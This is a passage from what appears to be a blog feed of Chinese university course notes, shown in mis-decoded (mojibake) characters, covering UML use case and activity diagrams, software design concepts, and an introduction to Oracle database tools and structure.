src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230402101.png" alt="image-20240104230402101" style="zoom:33%;" /><h4 id="æ‰©å±•å’ŒåŒ…å«"><a href="#æ‰©å±•å’ŒåŒ…å«" class="headerlink" title="æ‰©å±•å’ŒåŒ…å«"></a>æ‰©å±•å’ŒåŒ…å«</h4><ul><li>åœ¨<strong>æ‰©å±•å…³ç³»</strong>ä¸­ï¼Œä¸€ä¸ªåŸºæœ¬ç”¨ä¾‹æ‰§è¡Œæ—¶ï¼Œå¯ä»¥æ‰§è¡Œã€ä¹Ÿå¯ä»¥ä¸æ‰§è¡Œæ‰©å±•ç”¨ä¾‹éƒ¨åˆ†</li><li>åœ¨<strong>åŒ…å«å…³ç³»</strong>ä¸­ï¼Œåœ¨æ‰§è¡ŒåŸºæœ¬ç”¨ä¾‹æ—¶ï¼Œä¸€å®šä¼šæ‰§è¡ŒåŒ…å«ç”¨ä¾‹éƒ¨åˆ†</li></ul><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230824308.png" alt="image-20240104230824308" style="zoom:50%;" /><h4 id="æˆç»©ç®¡ç†ç³»ç»Ÿç”¨ä¾‹å›¾"><a href="#æˆç»©ç®¡ç†ç³»ç»Ÿç”¨ä¾‹å›¾" class="headerlink" title="æˆç»©ç®¡ç†ç³»ç»Ÿç”¨ä¾‹å›¾"></a>æˆç»©ç®¡ç†ç³»ç»Ÿç”¨ä¾‹å›¾</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230924962.png" alt="image-20240104230924962" style="zoom: 50%;" /><h3 id="è¡Œä¸ºæ¨¡å‹â€”â€”æ´»åŠ¨å›¾"><a href="#è¡Œä¸ºæ¨¡å‹â€”â€”æ´»åŠ¨å›¾" class="headerlink" title="è¡Œä¸ºæ¨¡å‹â€”â€”æ´»åŠ¨å›¾"></a>è¡Œä¸ºæ¨¡å‹â€”â€”æ´»åŠ¨å›¾</h3><h4 id="æ´»åŠ¨æ¨¡å‹"><a href="#æ´»åŠ¨æ¨¡å‹" class="headerlink" title="æ´»åŠ¨æ¨¡å‹"></a>æ´»åŠ¨æ¨¡å‹</h4><ul><li>èƒ½å¤Ÿå›¾å½¢åŒ–æ˜¾ç¤ºç”¨ä¾‹çš„äº‹ä»¶æµ</li><li>ä¹Ÿèƒ½ç”¨äº<ul><li>åœ¨ç”¨ä¾‹åˆ›å»ºä¹‹å‰ï¼Œåœ¨é«˜å±‚æŠ½è±¡ä¸Šç†è§£ä¸šåŠ¡è¿‡ç¨‹</li><li>åœ¨æ›´ä½å±‚æŠ½è±¡ä¸Šï¼Œè®¾è®¡å¤æ‚çš„é¡ºåºç®—æ³•æˆ–è®¾è®¡å¤šçº¿ç¨‹åº”ç”¨ä¸­çš„å¹¶å‘</li></ul></li></ul><h4 id="å±•ç¤ºè®¡ç®—çš„æ­¥éª¤"><a href="#å±•ç¤ºè®¡ç®—çš„æ­¥éª¤" class="headerlink" title="å±•ç¤ºè®¡ç®—çš„æ­¥éª¤"></a>å±•ç¤ºè®¡ç®—çš„æ­¥éª¤</h4><ul><li>æ¯ä¸€æ­¥éƒ½æ˜¯åšæŸäº‹çš„ä¸€ä¸ªçŠ¶æ€</li><li>æ‰§è¡Œæ­¥éª¤ç§°ä¸ºåŠ¨ä½œ</li><li>æè¿°å“ªäº›æ­¥éª¤è¢«é¡ºåºæ‰§è¡Œã€å“ªäº›å¯è¢«å¹¶å‘åœ°æ‰§è¡Œ</li><li>æ§åˆ¶æµ-æ§åˆ¶ä»ä¸€ä¸ªåŠ¨ä½œåˆ°ä¸‹ä¸€ä¸ªåŠ¨ä½œçš„æµ</li></ul><h4 id="å¼€å§‹ä¸ç»“æŸ"><a href="#å¼€å§‹ä¸ç»“æŸ" class="headerlink" title="å¼€å§‹ä¸ç»“æŸ"></a>å¼€å§‹ä¸ç»“æŸ</h4><p>&#x3D;&#x3D;å¼€å§‹&#x3D;&#x3D;</p><p>å®å¿ƒåœ†</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104234328851.png" alt="image-20240104234328851" style="zoom:33%;" /><p>&#x3D;&#x3D;ç»“æŸ&#x3D;&#x3D;</p><p>ç”¨â€œç‰›çœ¼ï¼ˆbullâ€™s eyeï¼‰â€ç¬¦å·è¡¨ç¤º</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104234359728.png" alt="image-20240104234359728" style="zoom:25%;" /><h4 id="æ§åˆ¶ç»“ç‚¹"><a href="#æ§åˆ¶ç»“ç‚¹" class="headerlink" title="æ§åˆ¶ç»“ç‚¹"></a>æ§åˆ¶ç»“ç‚¹</h4><ul><li>æ§åˆ¶èŠ‚ç‚¹æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ´»åŠ¨èŠ‚ç‚¹ï¼Œç”¨äºåœ¨åŠ¨ä½œèŠ‚ç‚¹æˆ–å¯¹è±¡ä¹‹é—´åè°ƒæµï¼ŒåŒ…æ‹¬åˆ†æ”¯ä¸åˆå¹¶ã€åˆ†å‰ä¸æ±‡åˆç­‰ã€‚</li><li>åˆ†æ”¯åŠåˆå¹¶ï¼ˆé’»çŸ³æ¡†ï¼‰ â€“ å¯é€‰è®¡ç®—çº¿ç¨‹</li></ul><h4 id="åˆ†æ”¯ä¸åˆå¹¶"><a href="#åˆ†æ”¯ä¸åˆå¹¶" class="headerlink" title="åˆ†æ”¯ä¸åˆå¹¶"></a>åˆ†æ”¯ä¸åˆå¹¶</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104234607453.png" alt="image-20240104234607453" style="zoom:50%;" /><h4 id="åˆ†å‰åŠæ±‡åˆ"><a href="#åˆ†å‰åŠæ±‡åˆ" class="headerlink" title="åˆ†å‰åŠæ±‡åˆ"></a>åˆ†å‰åŠæ±‡åˆ</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104235837810.png" alt="image-20240104235837810" style="zoom:50%;" /><h4 id="æ³³é“åˆ’åˆ†æ´»åŠ¨å›¾"><a href="#æ³³é“åˆ’åˆ†æ´»åŠ¨å›¾" class="headerlink" title="æ³³é“åˆ’åˆ†æ´»åŠ¨å›¾"></a>æ³³é“åˆ’åˆ†æ´»åŠ¨å›¾</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104235252099.png" alt="image-20240104235252099" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104235328404.png" alt="image-20240104235328404" style="zoom:50%;" /><h1 id="è½¯ä»¶è®¾è®¡"><a href="#è½¯ä»¶è®¾è®¡" class="headerlink" title="è½¯ä»¶è®¾è®¡"></a>è½¯ä»¶è®¾è®¡</h1><h2 id="è½¯ä»¶è®¾è®¡æ¦‚è¿°"><a href="#è½¯ä»¶è®¾è®¡æ¦‚è¿°" class="headerlink" title="è½¯ä»¶è®¾è®¡æ¦‚è¿°"></a>è½¯ä»¶è®¾è®¡æ¦‚è¿°</h2><h3 id="è½¯ä»¶è®¾è®¡çš„æ¦‚å¿µ"><a href="#è½¯ä»¶è®¾è®¡çš„æ¦‚å¿µ" class="headerlink" title="è½¯ä»¶è®¾è®¡çš„æ¦‚å¿µ"></a>è½¯ä»¶è®¾è®¡çš„æ¦‚å¿µ</h3><p>&#x3D;&#x3D;å®šä¹‰&#x3D;&#x3D;</p><p>è½¯ä»¶è®¾è®¡å®šä¹‰ä¸ºè½¯ä»¶ç³»ç»Ÿæˆ–ç»„ä»¶çš„<strong>æ¶æ„ã€æ„ä»¶ã€æ¥å£å’Œå…¶ä»–ç‰¹æ€§</strong>çš„å®šä¹‰è¿‡ç¨‹åŠè¯¥è¿‡ç¨‹çš„ç»“æœã€‚</p><p>è½¯ä»¶è®¾è®¡æ˜¯ï¼š</p><ul><li>è½¯ä»¶ç”Ÿå‘½å‘¨æœŸä¸­çš„ä¸€ä¸ªæ´»åŠ¨</li><li>è¿›è¡Œè½¯ä»¶ç¼–ç çš„åŸºç¡€</li><li>è½¯ä»¶éœ€æ±‚åˆ†æè¢«è½¬åŒ–ä¸ºè½¯ä»¶çš„å†…éƒ¨ç»“æ„</li><li>æ˜¯è¿æ¥ç”¨æˆ·éœ€æ±‚å’Œè½¯ä»¶æŠ€æœ¯çš„æ¡¥æ¢</li></ul><h4 id="è½¯ä»¶å·¥ç¨‹ä¸­çš„è®¾è®¡"><a href="#è½¯ä»¶å·¥ç¨‹ä¸­çš„è®¾è®¡" class="headerlink" title="è½¯ä»¶å·¥ç¨‹ä¸­çš„è®¾è®¡"></a>è½¯ä»¶å·¥ç¨‹ä¸­çš„è®¾è®¡</h4><ul><li>æ¨¡å‹è¾“å…¥<ul><li>è½¯ä»¶éœ€æ±‚çš„<strong>æ•°æ®æ¨¡å‹ã€åŠŸèƒ½æ¨¡å‹å’Œè¡Œä¸ºæ¨¡å‹</strong></li></ul></li><li>åˆ†ç±»<ul><li>æ•°æ®è®¾è®¡</li><li>æ¶æ„è®¾è®¡</li><li>æ¥å£è®¾è®¡</li><li>ç»„ä»¶è®¾è®¡</li></ul></li></ul><h4 id="è®¾è®¡ç›¸å…³æ¦‚å¿µ"><a href="#è®¾è®¡ç›¸å…³æ¦‚å¿µ" class="headerlink" title="è®¾è®¡ç›¸å…³æ¦‚å¿µ"></a>è®¾è®¡ç›¸å…³æ¦‚å¿µ</h4><ul><li>æŠ½è±¡ï¼šæ˜¯â€œ<strong>å¿½ç•¥å…·ä½“çš„ä¿¡æ¯å°†ä¸åŒäº‹ç‰©çœ‹æˆç›¸åŒäº‹ç‰©çš„è¿‡ç¨‹</strong>â€œ</li><li>ä½“ç³»ç»“æ„ï¼šè½¯ä»¶çš„æ•´ä½“ç»“æ„å’Œè¿™ç§ç»“æ„ä¸ºç³»ç»Ÿæä¾›æ¦‚å¿µä¸Šå®Œæ•´æ€§çš„æ–¹å¼</li><li>è®¾è®¡æ¨¡å¼ï¼šåœ¨ç»™å®šä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ä¸€ç±»å…±åŒé—®é¢˜çš„å…±åŒè§£å†³æ–¹æ¡ˆ</li><li>æ¨¡å—åŒ–ï¼šè½¯ä»¶è¢«åˆ’åˆ†ä¸ºå‘½åå’ŒåŠŸèƒ½ç›¸å¯¹ç‹¬ç«‹çš„å¤šä¸ªç»„ä»¶ï¼ˆé€šå¸¸ç§°ä¸ºæ¨¡å—ï¼‰ï¼Œé€šè¿‡è¿™äº›ç»„ä»¶çš„é›†æˆæ¥æ»¡è¶³é—®é¢˜çš„éœ€æ±‚</li><li>ä¿¡æ¯éšè—ï¼šæ¨¡å—å®šä¹‰å’Œè®¾è®¡æ—¶åº”å½“ä¿è¯æ¨¡å—å†…çš„ä¿¡æ¯ï¼ˆè¿‡ç¨‹å’Œæ•°æ®ï¼‰ä¸å¯ä»¥è¢«ä¸éœ€è¦è¿™äº›ä¿¡æ¯çš„å…¶ä»–æ¨¡å—è®¿é—®</li><li>åŠŸèƒ½ç‹¬ç«‹ï¼šæ¯ä¸ªæ¨¡å—åªè´Ÿè´£éœ€æ±‚ä¸­ç‰¹å®šçš„å­åŠŸèƒ½ï¼Œå¹¶ä¸”ä»ç¨‹åºç»“æ„çš„å…¶ä»–éƒ¨åˆ†çœ‹ï¼Œè¯¥æ¨¡å—å…·æœ‰ç®€å•çš„æ¥å£</li><li>ç²¾åŒ–ï¼šé€æ­¥æ±‚ç²¾çš„è¿‡ç¨‹</li><li>é‡æ„ï¼šä¸æ”¹å˜ç»„ä»¶åŠŸèƒ½å’Œè¡Œä¸ºæ¡ä»¶ä¸‹ï¼Œç®€åŒ–ç»„ä»¶è®¾è®¡ï¼ˆæˆ–ä»£ç ï¼‰çš„ä¸€ç§é‡ç»„æŠ€æœ¯</li></ul><h2 id="é¢å‘å¯¹è±¡è®¾è®¡"><a href="#é¢å‘å¯¹è±¡è®¾è®¡" class="headerlink" title="é¢å‘å¯¹è±¡è®¾è®¡"></a>é¢å‘å¯¹è±¡è®¾è®¡</h2><h3 id="æ¶æ„è®¾è®¡"><a href="#æ¶æ„è®¾è®¡" class="headerlink" title="æ¶æ„è®¾è®¡"></a>æ¶æ„è®¾è®¡</h3><p>æ¶æ„è®¾è®¡çš„ç›®çš„æ˜¯è¦å‹¾ç”»å‡ºç³»ç»Ÿå‡ºæ€»ä½“ç»“æ„ï¼Œè¿™é¡¹å·¥ä½œç”±ç»éªŒä¸°å¯Œçš„æ¶æ„è®¾è®¡å¸ˆä¸»æŒå®Œæˆã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110211359428.png" alt="image-20240110211359428" style="zoom: 33%;" /><h4 id="æ„é€ ç³»ç»Ÿçš„ç‰©ç†æ¨¡å‹"><a href="#æ„é€ ç³»ç»Ÿçš„ç‰©ç†æ¨¡å‹" class="headerlink" title="æ„é€ ç³»ç»Ÿçš„ç‰©ç†æ¨¡å‹"></a>æ„é€ ç³»ç»Ÿçš„ç‰©ç†æ¨¡å‹</h4><ul><li>é¦–å…ˆç”¨UMLçš„é…ç½®å›¾(éƒ¨ç½²å›¾)æè¿°ç³»ç»Ÿçš„ç‰©ç†ç»“æ„</li><li>å°†éœ€æ±‚åˆ†æé˜¶æ®µæ•è·çš„ç³»ç»ŸåŠŸèƒ½åˆ†é…åˆ°è¿™äº›ç‰©ç†ç»“ç‚¹ä¸Š</li><li>é…ç½®å›¾ä¸Šå¯ä»¥æ˜¾ç¤ºè®¡ç®—èŠ‚ç‚¹çš„æ‹“æ‰‘ç»“æ„ã€ç¡¬ä»¶è®¾å¤‡åŒ¹é…ã€é€šä¿¡è·¯å¾„ã€å„ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œçš„ç³»ç»Ÿè½¯ä»¶é…ç½®ã€åº”ç”¨è½¯ä»¶é…ç½®</li></ul><p>ä¾‹å›¾ï¼š<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110211638400.png" alt="image-20240110211638400" style="zoom: 67%;" /></p><h4 id="è®¾è®¡å­ç³»ç»Ÿ"><a href="#è®¾è®¡å­ç³»ç»Ÿ" class="headerlink" title="è®¾è®¡å­ç³»ç»Ÿ"></a>è®¾è®¡å­ç³»ç»Ÿ</h4><ul><li>å¯¹äºä¸€ä¸ªå¤æ‚çš„è½¯ä»¶ç³»ç»Ÿæ¥è¯´ï¼Œå°†å…¶åˆ†è§£æˆè‹¥å¹²ä¸ªå­ç³»ç»Ÿï¼Œå­ç³»ç»Ÿå†…è¿˜å¯ä»¥ç»§ç»­åˆ’åˆ†ç³»ç»Ÿæˆ–åŒ…ï¼Œè¿™ç§è‡ªé¡¶å‘ä¸‹ã€é€æ­¥ç»†åŒ–çš„ç»„ç»‡ç»“æ„éå¸¸ç¬¦åˆäººç±»åˆ†æé—®é¢˜çš„æ€è·¯</li><li>æ¯ä¸ªå­ç³»ç»Ÿä¸å…¶ä»–å­ç³»ç»Ÿä¹‹é—´åº”è¯¥å®šä¹‰æ¥å£ï¼Œåœ¨æ¥å£ä¸Šè¯´æ˜äº¤äº’ä¿¡æ¯ï¼Œæ³¨æ„è¿™æ—¶è¿˜ä¸è¦æè¿°å­ç³»ç»Ÿçš„å†…éƒ¨å®ç°</li><li>å¯ç”¨UNLç»„ä»¶å›¾è¡¨ç¤º</li></ul><p>ä¾‹å›¾ï¼š<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110211959943.png" alt="image-20240110211959943" style="zoom: 50%;" /></p><h4 id="éåŠŸèƒ½éœ€æ±‚è®¾è®¡"><a href="#éåŠŸèƒ½éœ€æ±‚è®¾è®¡" class="headerlink" title="éåŠŸèƒ½éœ€æ±‚è®¾è®¡"></a>éåŠŸèƒ½éœ€æ±‚è®¾è®¡</h4><ul><li>åˆ†æé˜¶æ®µå®šä¹‰äº†æ•´ä¸ªç³»ç»Ÿçš„éåŠŸèƒ½éœ€æ±‚ï¼Œåœ¨æ°´æœç›’å‡ é˜¶æ®µè¦ç ”ç©¶è¿™äº›éœ€æ±‚ï¼Œè®¾è®¡å‡ºå¯è¡Œçš„æ–¹æ¡ˆ</li><li>éåŠŸèƒ½éœ€æ±‚åŒ…æ‹¬ï¼š<ul><li>ç³»ç»Ÿçš„å®‰å…¨æ€§</li><li>é”™è¯¯æ£€æµ‹å’Œæ•…éšœæ¢å¤</li><li>å¯ç§»æ¤æ€§å’Œé€šç”¨æ€§ç­‰</li></ul></li></ul><h3 id="ç”¨ä¾‹è®¾è®¡ä¸ç±»è®¾è®¡"><a href="#ç”¨ä¾‹è®¾è®¡ä¸ç±»è®¾è®¡" class="headerlink" title="ç”¨ä¾‹è®¾è®¡ä¸ç±»è®¾è®¡"></a>ç”¨ä¾‹è®¾è®¡ä¸ç±»è®¾è®¡</h3><ul><li>æ ¹æ®åˆ†æé˜¶æ®µäº§ç”Ÿçš„é«˜å±‚ç±»å›¾å’Œäº¤äº’å›¾ï¼Œç”±ç”¨ä¾‹è®¾è®¡å¸ˆç ”ç©¶å·²æœ‰çš„ç±»ï¼Œå°†å®ƒä»¬åˆ†é…åˆ°ç›¸åº”çš„ç”¨ä¾‹ä¸­</li><li>æ£€æŸ¥æ¯ä¸ªç”¨ä¾‹åŠŸèƒ½ï¼Œä¾é å½“å‰çš„ç±»èƒ½å¦å®ç°ï¼ŒåŒæ—¶æ£€æŸ¥æ¯ä¸ªç”¨ä¾‹çš„ç‰¹æ®Šéœ€æ±‚æ˜¯å¦æœ‰åˆé€‚çš„ç±»æ¥å®ç°</li><li>ç»†åŒ–æ¯ä¸ªç”¨ä¾‹çš„ç±»å›¾ï¼Œæè¿°å®ç°ç”¨ä¾‹çš„ç±»åŠå…¶ç±»ä¹‹é—´çš„ç›¸äº’å…³ç³»ï¼Œå…¶ä¸­çš„é€šç”¨åˆ—å’Œå…³é”®ç±»å¯ç”¨ç²—çº¿æ¡†åŒºåˆ†ï¼Œè¿™äº›ç±»å°†ä½œä¸ºé¡¹ç›®ç»å†æ£€æŸ¥é¡¹ç›®æ—¶çš„é‡ç‚¹</li></ul>]]></content>
      
      
      <categories>
          
          <category> è¯¾å†… </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯¾å†… </tag>
            
            <tag> è½¯ä»¶å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oracle å®éªŒ</title>
      <link href="/2024/01/01/oracle%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/01/01/oracle%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•°æ®åº“ç³»ç»Ÿæ¦‚è¿°"><a href="#æ•°æ®åº“ç³»ç»Ÿæ¦‚è¿°" class="headerlink" title="æ•°æ®åº“ç³»ç»Ÿæ¦‚è¿°"></a>æ•°æ®åº“ç³»ç»Ÿæ¦‚è¿°</h2><h3 id="æ•°æ®åº“å·¥å…·"><a href="#æ•°æ®åº“å·¥å…·" class="headerlink" title="æ•°æ®åº“å·¥å…·"></a>æ•°æ®åº“å·¥å…·</h3><blockquote><p>Oracle Enterprise Manager Database Expresså·¥å…·</p></blockquote><ul><li>ä¼ä¸šç®¡ç†å™¨æ•°æ®åº“å¿«æ·ç‰ˆï¼Œä¸ºDBAç”¨æˆ·æä¾›åŸºæœ¬çš„æ•°æ®åº“ç³»ç»Ÿç®¡ç†åŠŸèƒ½</li><li>åœ¨æµè§ˆå™¨ä¸­è®¿é—®<code>https://localhost:5500/em/login</code>è¿›å…¥æ•°æ®åº“ç®¡ç†ç™»å½•é¡µé¢</li><li>æä¾›å®‰å…¨ç®¡ç†(è¡¨ç©ºé—´ã€è¿˜åŸç®¡ç†ã€å½’æ¡£æ—¥å¿—ã€æ§åˆ¶æ–‡ä»¶)ã€é…ç½®ç®¡ç†(åˆå§‹åŒ–å‚æ•°ã€å†…å­˜ã€å½“å‰æ•°æ®åº“å±æ€§)å’Œæ€§èƒ½ç›‘æ§(ä¸»æœºè´Ÿè½½ã€ä¸»æœºå†…å­˜ã€ä¸»æœºI&#x2F;O)</li></ul><blockquote><p>Oracle SQL Developerå·¥å…·</p></blockquote><ul><li>æ”¯æŒDBAè¿›è¡Œæ•°æ®åº“ç®¡ç†åŠŸèƒ½æ“ä½œ</li><li>ä¹Ÿèƒ½æ”¯æŒDBAè¿›è¡Œæ•°æ®åº“å¼€å‘å¯¹è±¡æ“ä½œ(åˆ›å»ºæ•°æ®åº“è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€è§¦å‘å™¨å’Œå­˜å‚¨è¿‡ç¨‹ç­‰å¯¹è±¡)</li></ul><blockquote><p>Database Configuration Assistantå·¥å…·</p></blockquote><ul><li>æ•°æ®åº“é…ç½®åŠ©æ‰‹ï¼ŒDBCAã€‚</li><li>å¯ä»¥æ–°å»ºæˆ–åˆ é™¤ä¸€ä¸ªæ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥å¯¹ä»¥æœ‰çš„æ•°æ®åº“é…ç½®è¿›è¡Œä¿®æ”¹</li></ul><blockquote><p>SQL Pluså·¥å…·</p></blockquote><ul><li>åŸºäºå‘½ä»¤è¡Œçš„æ•°æ®åº“æ“ä½œå·¥å…·</li><li>å¯ä»¥å°†SQLè¯­è¨€å‘½ä»¤å’ŒPL&#x2F;SQLè¯­è¨€å‘½ä»¤æäº¤æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ‰§è¡Œï¼Œå®ç°å¯¹æ•°æ®åº“è¿›è¡Œæ“ä½œè®¿é—®å’Œæ•°æ®åº“ç®¡ç†</li><li>å¯ä»¥å®ç°å¯¹æ•°æ®åº“æœåŠ¡å¯åœæ§åˆ¶ã€æ•°æ®åº“åˆ›å»ºã€ç”¨æˆ·æƒé™ç®¡ç†å’Œæ•°æ®è¡¨è®¿é—®ç­‰æ“ä½œ</li></ul><h3 id="æ•°æ®åº“ç³»ç»Ÿç»“æ„"><a href="#æ•°æ®åº“ç³»ç»Ÿç»“æ„" class="headerlink" title="æ•°æ®åº“ç³»ç»Ÿç»“æ„"></a>æ•°æ®åº“ç³»ç»Ÿç»“æ„</h3><h4 id="å…³ç³»æ•°æ®æ¨¡å‹"><a href="#å…³ç³»æ•°æ®æ¨¡å‹" class="headerlink" title="å…³ç³»æ•°æ®æ¨¡å‹"></a>å…³ç³»æ•°æ®æ¨¡å‹</h4><p>å…³ç³»æ•°æ®æ¨¡å‹æ˜¯ä¸€ç§ä»¥å…³ç³»è¡¨ä¸ºæ•°æ®ç»“æ„ã€é‡‡ç”¨å…³ç³»æ“ä½œæ–¹å¼è®¿é—®æ•°æ®çš„æ•°æ®æ¨¡å‹ã€‚è¯¥æ•°æ®æ¨¡å‹ç”±å¦‚ä¸‹ä¸‰ç§éƒ¨åˆ†ç»„æˆã€‚</p><ul><li>å…³ç³»è¡¨ç»“æ„</li><li>å…³ç³»æ“ä½œ   [é€‰æ‹©ï¼Œå¤´å‹ï¼Œè¿æ¥Â·Â·]</li><li>å…³ç³»çº¦æŸ   [å®Œæ•´æ€§çº¦æŸï¼Œå‚ç…§å®Œæ•´æ€§çº¦æŸï¼Œè‡ªå®šä¹‰å®Œæ•´æ€§çº¦æŸ]</li></ul><p>å…³ç³»æ•°æ®åº“æ˜¯ä¸€ç§ä¾èµ–å…³ç³»æ¨¡å‹ç»„ç»‡ã€å­˜å‚¨å’Œç®¡ç†æ•°æ®çš„æ•°æ®åº“ã€‚åœ¨æ•°æ®åº“ä¸­ï¼Œä¸ä»…å­˜æ”¾äº†æ•°æ®ï¼Œè¿˜å­˜æ”¾äº†æ•°æ®ç»“æ„åŠå…¶æ•°æ®å…³ç³»ã€‚</p><h4 id="å¤šæ¨¡æ•°æ®åº“"><a href="#å¤šæ¨¡æ•°æ®åº“" class="headerlink" title="å¤šæ¨¡æ•°æ®åº“"></a>å¤šæ¨¡æ•°æ®åº“</h4><ul><li>å…³ç³»æ•°æ®åº“â€”â€”å…³ç³»æ•°æ®æ¨¡å‹</li><li>jsonæ•°æ®åº“â€”â€”jsonæ•°æ®æ¨¡å‹</li><li>xmlæ•°æ®åº“â€”â€”XMLæ•°æ®æ¨¡å‹</li><li>æ–‡æ¡£æ•°æ®åº“â€”â€”æ–‡æ¡£æ•°æ®æ¨¡å‹</li><li>é”®å€¼</li><li>å›¾</li><li>ç©ºé—´</li><li>Â·Â·Â·</li></ul><p>åé¢çš„éƒ½æ˜¯<strong>nosql</strong>æ•°æ®åº“ã€‚</p><h4 id="æ•°æ®åº“ç³»ç»Ÿç»„æˆ"><a href="#æ•°æ®åº“ç³»ç»Ÿç»„æˆ" class="headerlink" title="æ•°æ®åº“ç³»ç»Ÿç»„æˆ"></a>æ•°æ®åº“ç³»ç»Ÿç»„æˆ</h4><p>ä¸å…¶ä»–å…³ç³»æ•°æ®åº“ç³»ç»Ÿä¸€æ ·ï¼Œéƒ½æ˜¯ç”±ç”¨æˆ·ã€æ•°æ®åº“ã€æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå’Œæ•°æ®åº“åº”ç”¨ç¨‹åº4ä¸ªéƒ¨åˆ†ç»„æˆã€‚</p><h5 id="æ•°æ®åº“ç”¨æˆ·"><a href="#æ•°æ®åº“ç”¨æˆ·" class="headerlink" title="æ•°æ®åº“ç”¨æˆ·"></a>æ•°æ®åº“ç”¨æˆ·</h5><p>æ•°æ®åº“ç”¨æˆ·å°±æ˜¯æ•°æ®åº“ç³»ç»Ÿçš„ä½¿ç”¨äººå‘˜</p><h5 id="æ•°æ®åº“åº”ç”¨ç¨‹åº"><a href="#æ•°æ®åº“åº”ç”¨ç¨‹åº" class="headerlink" title="æ•°æ®åº“åº”ç”¨ç¨‹åº"></a>æ•°æ®åº“åº”ç”¨ç¨‹åº</h5><p>æ•°æ®åº“åº”ç”¨ç¨‹åºæ˜¯ä¸€ç§åœ¨DBMSæ”¯æŒä¸‹å¯¹æ•°æ®è¿›è¡Œè®¿é—®å¤„ç†çš„åº”ç”¨ç¨‹åºã€‚ä½¿ç”¨ç¼–ç¨‹è¯­è¨€(å¦‚JAVAã€C++ç­‰)å®ç°å¯¹æ•°æ®åº“ä¿¡æ¯çš„æ“ä½œè®¿é—®ï¼Œä½†å®ƒä»¬éœ€è¦åŸºäºDBMSæä¾›çš„æœ¬åœ°é©±åŠ¨æ¥å£æˆ–æ ‡å‡†æ¥å£(å¦‚ODBCã€JDBCç­‰)æ‰èƒ½è¿æ¥ä¸è®¿é—®æ•°æ®åº“</p><h5 id="æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ"><a href="#æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ"></a>æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ</h5><p>database manage systemï¼ŒDBMSâ€”â€”æ˜¯ä¸€ç§ä¸“é—¨ç”¨æ¥ä¼ å»ºæ•°æ®åº“ï¼Œç®¡ç†æ•°æ®åº“ï¼Œç»´æŠ¤æ•°æ®åº“ï¼Œå¹¶å¯¹å¤–æä¾›æ•°æ®åº“åŠŸèƒ½çš„</p><p>ä¸»è¦åŠŸèƒ½æœ‰ï¼š</p><ul><li>åˆ›å»ºæ•°æ®åº“ã€æ•°æ®åº“è¡¨åŠå…¶ä»–å¯¹è±¡</li><li>è¯»å†™ã€ä¿®æ”¹å’Œåˆ é™¤æ•°æ®åº“è¡¨æ•°æ®</li><li>ç»´æŠ¤æ•°æ®åº“ç»“æ„</li><li>æ‰§è¡Œæ•°æ®è®¿é—®è§„åˆ™</li><li>æä¾›æ•°æ®åº“å¹¶å‘æ§åˆ¶å’Œå®‰å…¨æ§åˆ¶</li><li>æ‰§è¡Œæ•°æ®åº“å¤‡ä»½å’Œæ¢å¤</li><li>Â·Â·Â·</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113112351876.png" alt="image-20231113112351876" style="zoom:50%;" /><h6 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h6><p>åœ¨oracleæ•°æ®åº“ä¸­ï¼Œä¸»è¦é‡‡ç”¨å…³ç³»è¡¨ç»„ç»‡ä¸å­˜å‚¨æ•°æ®ã€‚é™¤äº†å­˜å‚¨å’Œç®¡ç†åº”ç”¨çš„ç”¨æˆ·æ•°æ®å¤–ï¼Œè¿˜éœ€è¦å­˜å‚¨ä¸ç®¡ç†æ•°æ®åº“æœ¬èº«çš„å…ƒæ•°æ®ã€ç´¢å¼•æ•°æ®ã€è¿è¡Œæ•°æ®ç­‰ç³»ç»Ÿæ•°æ®</p><p>æ•°æ®åº“ä¸­æ‰€åŒ…å«çš„å„ç±»æ•°æ®å†…å®¹ï¼š</p><ul><li>ç”¨æˆ·æ•°æ®</li><li>å…ƒæ•°æ®(æ•°æ®è¡¨çš„è¡¨åç§°ã€è¡¨å±æ€§ã€åˆ—åç§°ã€åˆ—å±æ€§ã€è¡¨ä¹‹é—´çš„æ•°æ®çº¦æŸå…³ç³»)</li><li>ç´¢å¼•æ•°æ®</li><li>å…¶ä»–æ•°æ®</li></ul><h4 id="æ•°æ®åº“ç»“æ„"><a href="#æ•°æ®åº“ç»“æ„" class="headerlink" title="æ•°æ®åº“ç»“æ„"></a>æ•°æ®åº“ç»“æ„</h4><h5 id="æ•°æ®åº“é€»è¾‘ç»“æ„"><a href="#æ•°æ®åº“é€»è¾‘ç»“æ„" class="headerlink" 